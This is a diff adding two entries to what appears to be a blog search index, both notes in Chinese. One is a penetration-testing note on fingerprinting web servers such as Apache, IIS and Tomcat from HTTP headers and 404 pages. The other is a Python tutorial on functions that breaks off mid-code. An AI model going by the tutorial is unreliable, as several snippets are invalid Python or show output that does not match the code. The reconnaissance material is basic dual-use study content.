@@ -487,6 +487,201 @@
       </tags>
   </entry>
   <entry>
+    <title>信息收集-WEB服务器</title>
+    <url>//ef172fa947be.html</url>
+    <content><![CDATA[<h2 id="WEB服务器简介"><a href="#WEB服务器简介" class="headerlink" title="WEB服务器简介"></a>WEB服务器简介</h2><p>WEB服务器是指网站服务器，用来使服务器提供WEB访问</p>
+<p>可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览</p>
+<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>世界上使用最多的web服务器</p>
+<p>具有跨平台，安全性高的优点</p>
+<p>可以通过API扩展，将<code>perl/Python</code>等解释器编译到服务器中</p>
+<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"># HTTP头部中server标头在Date之后</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"># 当HTTP返回404时，报错信息为Not Found</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">404</span> Not Found</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS（Internet Information Services）是Microsoft的Web服务组件</p>
+<p>其中包括Web服务器，FTP服务器，NNTP服务器和SMTP服务器。</p>
+<p>通过ISAP（Internet Server API）作为扩展web服务器功能的编程接口</p>
+<p>通过Internet数据库连接器，可以实现对数据库的查询和更新</p>
+<h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Microsoft-IIS/5.0</span><br><span class="line"># 当HTTP返回404时，报错信息为Object Not Found</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">404</span> Object Not Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Microsoft-IIS/5.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h2><p>JBoss是一个种遵从JavaEE规范的、开放源代码的、纯Java的EJB服务器，对于J2EE有很好的支持</p>
+<p>JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。</p>
+<p>但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<h2 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h2><p>Jetty是一种开源的servlet容器，它为基于Java的网络内容，如JSP和servlet提供运行环境。</p>
+<h2 id="Kangle"><a href="#Kangle" class="headerlink" title="Kangle"></a>Kangle</h2><p>kangle web服务器（简称：kangle）是一款跨平台、功能强大、安全稳定、易操作的高性能web服务器和反向代理服务器软件。</p>
+<p>kangle也是一款专为做虚拟主机研发的web服务器。实现虚拟主机独立进程、独立身份运行。</p>
+<p>用户之间安全隔离，一个用户出问题不影响其他用户。安全支持php、asp、asp·net、java、ruby等多种动态开发语言。</p>
+<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx不仅是一个小巧且高效的HTTP服务器，也可以做一个高效的负载均衡反向代理</p>
+<p>通过它接受用户的请求并分发到多个Mongrel进程可以极大提高Rails应用的并发能力。</p>
+<p>支持通用语言接口，如php、python、perl等</p>
+<p>支持正向和反向代理、虚拟主机、url重写、压缩传输等</p>
+<p> nginx的模块都是静态编译的，对fcgi的支持非常好，在处理链接的的方式上nginx支持epoll</p>
+<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Tomcat运行servlet和JSP Web应用软件的基于Java的Web应用软件容器</p>
+<p>Tomcat Server是根据servlet和JSP规范进行执行的</p>
+<p>Tomcat是Apache软件基金会（ApacheSoftwareFoundation）的Jakarta项目中的一个核心项目，由Apache、Sun和其他一些公司及个人共同开发而成。</p>
+<h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tomcat</span><br></pre></td></tr></table></figure>
+
+<p><strong>基于404报错</strong></p>
+<p>构造一个不存在的资源<br>URL/456sadaw.741<br>在源代码中包含如下代码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h2><p>Web服务器是一种多功能、基于标准的 Web应用服务器。</p>
+<p>各种应用开发、部署所有关键性的任务，无论是集成各种系统和数据库，还是提交服务、跨 Internet 协作，起始点都是 BEA WebLogic Server。</p>
+<p>由于它具有全面的功能、对开放标准的遵从性、多层架构、支持基于组件的开发，基于 Internet 的企业都选择它来开发、部署最佳的应用。</p>
+<h2 id="WebSphere"><a href="#WebSphere" class="headerlink" title="WebSphere"></a>WebSphere</h2><p>作为一台功能完善的开放 Web应用服务器， 是 IBM电子商务项目的核心部分，它为因特网和内网 Web应用建立、部署和管理 Java应用环境。</p>
+<h2 id="BEAWeblogic"><a href="#BEAWeblogic" class="headerlink" title="BEAWeblogic"></a>BEAWeblogic</h2><p>BEAWebLogic是一个 Java应用服务器，用于开发、集成、部署和管理大型分布式 Web、网络和数据库应用程序。</p>
+<h2 id="Lighttpd"><a href="#Lighttpd" class="headerlink" title="Lighttpd"></a>Lighttpd</h2><p>Lighttpd是由德国人JanKneschke领导开发的，基于BSD许可的开源WEB服务器软件。</p>
+<p>其根本的目的是提供一个专门针对高性能网站，安全、快速、兼容性好并且灵活的webserver环境。</p>
+<p>具有非常低的内存开销，CPU占用率低，效能好，以及丰富的模块等特点。</p>
+<p>支持FastCGI,CGI,Auth,输出压缩(outputcompress),URL重写,Alias等重要功能。</p>
+<h2 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>Resin是Caucho公司的产品，是一个非常流行的支持Servlet和JSP的服务器，速度非常快。</p>
+<p>Resin的一种先进的语言XSL(XML stylesheet language)可以使得形式和内容相分离，支持EJB。</p>
+<p>Resin本身包含了一个支持HTML的Web服务器，这使它不仅可以显示动态内容，而且显示静态内容的能力也毫不逊色。</p>
+<h2 id="Sun"><a href="#Sun" class="headerlink" title="Sun"></a>Sun</h2><p>sun的 Java系统 Web服务器，即 sun ONE Web Server。大多数情况下是在运行 Sun公司的 Solaris操作系统的任务级 Web服务器上。</p>
+<p>Sun Web Server包括ava™Servlet 2.3和JavaServer Pages™（JSP™）1.2规范的Java™2平台，企业版（J2EE™）兼容实现。符合J2EE的Web容器提供了设计和部署符合Java™技术标准的Web应用程序所需的灵活性和可靠性。</p>
+<p>Sun是基于开放标准构建的多进程，多线程，安全的Web服务器</p>
+<h2 id="Zeus"><a href="#Zeus" class="headerlink" title="Zeus"></a>Zeus</h2><p>Zeus是一个运行于Unix下的非常优秀的Web服务器，是效率最高的Web服务器之一。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>信息收集</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-函数</title>
+    <url>//a7d380d29206.html</url>
+    <content><![CDATA[<h2 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h2><p>​        通过将一段有规律的、重复的代码定义为函数，来达到一次编写、多次调用的目的。使用函数可以提高代码的重复利用率。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="function"><span class="keyword">def</span> 函数名(<span class="params">形参<span class="number">1</span>,形参<span class="number">2</span>,形参<span class="number">3.</span>..形参n</span>)</span></span><br><span class="line"><span class="function">	代码块</span></span><br><span class="line"><span class="function"># 定义形参就相当于声明了变量，但是不赋值</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">调用函数</span></span><br><span class="line"><span class="function">函数对象(<span class="params">实参</span>)</span></span><br><span class="line"><span class="function"># 形参可以指定默认值，当用户没有指定形参时，默认值才会生效</span></span><br><span class="line"><span class="function"># 在定义函数时，可以在形参前面加上一个*，这样这个形参就会获取到所有的实参，保存在一个元组中</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="实参的传递方式"><a href="#实参的传递方式" class="headerlink" title="实参的传递方式"></a>实参的传递方式</h2><h3 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h3><p>位置参数就是将对应位置的实参复制给对应位置的形参</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h3><p>当形参指定了默认值，并且该形参没有赋值，使用默认值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(a=<span class="number">1</span>,b=<span class="number">2</span>)</span><br><span class="line"><span class="comment"># 当c没有赋值时，使用默认值c=10</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><p>使用形式参数的名字来确定输入的参数值。通过此方式指定函数实参时，不再需要与形参的位置完全一致，只要将参数名写正确即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">fn(c=<span class="number">3</span>,b=<span class="number">2</span>,a=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># *形参只能接收位置参数，而不能接收关键字参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,*c</span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params"><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># **形参可以接收其他的关键字参数，它会将这些参数统一保存到一个字典中</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">fn</span>(<span class="params">a,b,**c</span>)</span></span><br><span class="line"><span class="function"><span class="title">fn</span>(<span class="params">a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>,d=<span class="number">4</span></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line">d = &#123;&#x27;a&#x27;:100,&#x27;b&#x27;:200,&#x27;c&#x27;:300&#125;</span><br><span class="line">fn(**d)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a,b,c</span>)</span></span><br><span class="line">变量 = (1,2,3)</span><br><span class="line">fn(*变量)</span><br><span class="line">变量 = (a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>)</span><br><span class="line">fn(**变量)</span><br><span class="line"><span class="comment">#可以是任意序列或者字典，个数与形参一样，字典用**表示</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>​        在Python中，可以在函数体内使用return语句为函数指定返回值，为函数设置返回值的作用就是将函数的处理结果返回给调用它的函数。该返回值可以是任意类型，并且无论return语句出现在函数的什么位置，只要得到执行，就会直接结束函数的执行。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn2</span>() :</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> fn2()</span><br><span class="line">fn()</span><br><span class="line"><span class="comment"># 这个函数的执行结果就是它的返回值，也可以 变量 = fn()</span></span><br><span class="line"><span class="comment"># return后面可以跟任意形式的值，return后的代码都不会执行，可以用来结束函数</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文档字符串"><a href="#文档字符串" class="headerlink" title="文档字符串"></a>文档字符串</h2><p>文档字符串就是一个函数的使用说明</p>
+<p>可以使用<code>help()</code>函数查看该函数的使用说明</p>
+<p>使用三引号创建文档字符串</p>
+<h2 id="作用域（scope）"><a href="#作用域（scope）" class="headerlink" title="作用域（scope）"></a>作用域（scope）</h2><p>作用域就是指变量生效的区域，在执行时创建，在执行结束时销毁</p>
+<p><strong>全局作用域</strong></p>
+<p>所有函数以外的区域都是全局作用域，可以在程序的任意位置被访问</p>
+<p><strong>函数作用域</strong></p>
+<p>在函数作用域中定义的变量，都是局部变量，它只能在函数内部被访问</p>
+<p><strong>可以使用 global 变量，来声明变量是全局变量</strong></p>
+<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>每一个作用域都会有一个它对应的命名空间，是一个专门用来存储变量的字典</p>
+<p>全局命名空间，用于保存全局变量。函数命名空间用来保存函数中的变量</p>
+<p><code>locals()</code>用来获取当前作用域的命名空间，返回的是一个字典</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">变量 = <span class="built_in">locals</span>()</span><br><span class="line"><span class="comment"># 当前命名空间</span></span><br><span class="line"><span class="built_in">globals</span>()</span><br><span class="line"><span class="comment"># 函数可以用来在任意位置获取全局命名空间</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>递归（Recursion），就是指在函数的定义中使用函数自身的方法</p>
+<p>如果函数中包含了对自身的调用，该函数就是使用了递归的方法</p>
+<p>函数自己调用自己，和循环类似</p>
+<p>它的整体思想是，将一个大问题分解为一个个的小问题，直到问题无法分解时，再去解决问题</p>
+<p>递归函数的两个要件</p>
+<ul>
+<li>基线条件：确定递归到何时终止，函数不在调用自己</li>
+<li>递归条件：将问题继续分解的条件</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例1：判断任意数的阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">n</span>):</span></span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> n * fn(n-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(fn(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 例2：判断是否为回文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">n</span>) :</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(n) &lt; <span class="number">2</span> :</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">elif</span> n[<span class="number">0</span>] != n[-<span class="number">1</span>] :</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> fn1(n[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(fn1(<span class="string">&#x27;abcdcba&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="匿名函数（lambda）"><a href="#匿名函数（lambda）" class="headerlink" title="匿名函数（lambda）"></a>匿名函数（lambda）</h2><p>lambda函数表达式专门用来创建一些简单的函数，可以创建一次性的函数，不需要为函数命名</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">lambda</span> 参数列表 : 返回值</span><br><span class="line"></span><br><span class="line">r = (<span class="keyword">lambda</span> a,b : a+b)(<span class="number">10</span>,<span class="number">20</span>)</span><br><span class="line">fn = <span class="keyword">lambda</span> a,b : a+b</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(fn(<span class="number">10</span>,<span class="number">20</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="高阶函数"><a href="#高阶函数" class="headerlink" title="高阶函数"></a>高阶函数</h2><p>接收函数作为参数，或者将函数作为返回值的函数是高阶函数</p>
+<p>当我们使用一个函数作为参数时，实际上是将指定的代码传递进了目标函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># 把判断传参是否是2的倍数，如果是返回True，否则返回False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">func,lst</span>):</span></span><br><span class="line">    new_list = []</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="keyword">if</span> func(n):</span><br><span class="line">            new_list.append(n)</span><br><span class="line">    <span class="keyword">return</span> new_list</span><br><span class="line"><span class="comment"># 遍历形参lst,如果n传入形参func函数的结果为True,则把n传入新列表，最后返回新列表</span></span><br><span class="line"><span class="built_in">print</span>(fn(fn2,l))</span><br><span class="line"><span class="comment"># 调用函数fn,把函数fn2传入形参func,把列表l传入形参lst</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h2><p><code>filter()</code>用于过滤序列，过滤掉不符合条件的元素</p>
+<p><code>filter()</code>函数本身不对序列作任何修改</p>
+<p><code>filter()</code>函数返回的结果是一个迭代器对象</p>
+<p>接收两个参数，第一个为函数，第二个为序列，序列的每个元素作为参数传递给函数进行判断，然后返回 True 或 False，最后将返回 True 的元素放到新列表中</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参数：</span></span><br><span class="line"><span class="comment">#  1.函数，根据该函数来过滤序列（可迭代的结构）</span></span><br><span class="line"><span class="comment">#  2.需要过滤的序列（可迭代的结构）</span></span><br><span class="line"><span class="comment"># 返回值：</span></span><br><span class="line"><span class="comment">#   过滤后的新序列（可迭代的结构）</span></span><br><span class="line"></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn2</span>(<span class="params">n</span>) :</span></span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span></span><br><span class="line">r = <span class="built_in">filter</span>(fn2,l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(r))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="map-函数"><a href="#map-函数" class="headerlink" title="map()函数"></a>map()函数</h2><p><code>map()</code>会根据提供的函数对指定序列做映射</p>
+<p><code>map()</code>函数返回的结果是一个迭代器对象</p>
+<p>用来通过函数修改列表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="built_in">map</span>(函数,列表)</span><br><span class="line"></span><br><span class="line">l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">a = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line">b = <span class="built_in">map</span>(a,l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(b))</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h2><p>通过<code>sort()</code>函数对序列排序</p>
+<p>在<code>sort()</code>可以接收一个关键字参数 ，key</p>
+<p>key需要一个函数作为参数，当设置了函数作为参数</p>
+<p>每次都会以列表中的一个元素作为参数来调用函数，并且使用函数的返回值来比较元素的大小</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">a.sort(key=fn)</span><br><span class="line"><span class="comment"># 这里通过函数fn()获取到列表的第二位</span></span><br><span class="line"><span class="comment"># 2,4,1,3</span></span><br><span class="line"><span class="comment"># 然后通过列表的sort()方法对2,4,1,3做默认升序排序</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">[(<span class="number">4</span>, <span class="number">1</span>), (<span class="number">2</span>, <span class="number">2</span>), (<span class="number">1</span>, <span class="number">3</span>), (<span class="number">3</span>, <span class="number">4</span>)]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h2><p>这个函数和<code>sort()</code>的用法基本一致，但是sorted()可以对任意的序列进行排序</p>
+<p>并且使用sorted()排序不会影响原来的对象，而是返回一个新对象</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">2</span>,<span class="number">5</span>,<span class="string">&#x27;1&#x27;</span>,<span class="number">3</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;4&#x27;</span>]</span><br><span class="line">l = <span class="string">&quot;123765816742634781&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(l,key=<span class="built_in">int</span>))</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;4&#x27;</span>, <span class="number">5</span>, <span class="string">&#x27;6&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>将函数作为返回值返回，也是一种高阶函数,叫做闭包</p>
+<p>通过闭包可以创建一些只有当前函数能访问的变量</p>
+<p>可以将一些私有的数据藏到的闭包中</p>
+<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">直接调用函数</button></li><li class="tab"><button type="button" data-href="#-2">返回函数名称</button></li><li class="tab"><button type="button" data-href="#-3">利用闭包保存变量的值</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(a+b+c)</span><br><span class="line">    fn1(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>)</span><br><span class="line">fn(<span class="string">&quot;name&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(a+b+c)</span><br><span class="line">    <span class="keyword">return</span> fn1</span><br><span class="line">	<span class="comment"># 此处不直接调用，而是返回函数名称（Python中一切皆对象）</span></span><br><span class="line">fn2 = fn(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="comment"># 调用包装器</span></span><br><span class="line">fn2(<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>)</span><br><span class="line"><span class="comment"># 调用内部函数</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用闭包之前</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>(<span class="params">a</span>):</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    num = num + a</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (b &lt; <span class="number">5</span>):</span><br><span class="line">    fn(<span class="number">1</span>)</span><br><span class="line">    b += <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># 当我们不希望num这个序列被更改时，可以添加一个函数（闭包），让作用域变成函数作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    num = <span class="number">1</span>	<span class="comment"># 这里num只能通过fn1()来看到</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fn1</span>(<span class="params">a</span>):</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num	<span class="comment"># 因为作用域，num不能直接被更改，使用nonlocal使上级作用域可以被更改</span></span><br><span class="line">        num = num + a	</span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="keyword">return</span> fn1	<span class="comment">#让函数fn1作为返回值返回</span></span><br><span class="line">fn2 = fn()	<span class="comment"># 这里fn2的作用是调用fn()后返回的函数</span></span><br><span class="line">b = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (b &lt; <span class="number">5</span>):</span><br><span class="line">    fn2(<span class="number">1</span>)</span><br><span class="line">    b += <span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="comment"># 使用闭包后,局部变量num的值就会保存下来,而不是每次调用函数后销</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fn</span>():</span></span><br><span class="line">    num = []	<span class="comment"># 如果num是列表，可以使用列表方法来更改，不需要nonlocal</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span 